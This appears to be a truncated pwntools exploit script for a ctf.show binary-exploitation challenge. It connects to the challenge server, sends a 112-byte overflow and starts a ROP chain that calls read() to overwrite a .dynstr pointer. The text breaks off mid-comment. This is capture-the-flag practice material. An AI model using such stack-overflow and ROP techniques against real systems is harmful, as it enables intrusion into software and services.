from pwn import *
context.log_level = 'debug'
#io = process("./pwn")
io = remote('pwn.challenge.ctf.show',28291)
elf = ELF("./pwn")
rop = ROP("./pwn")
io.recvuntil('Welcome to CTFshowPWN!\n')
offset = 112
rop.raw(offset*'a')
rop.read(0,0x08049804+4,4)                      # modify .dynstr pointer in
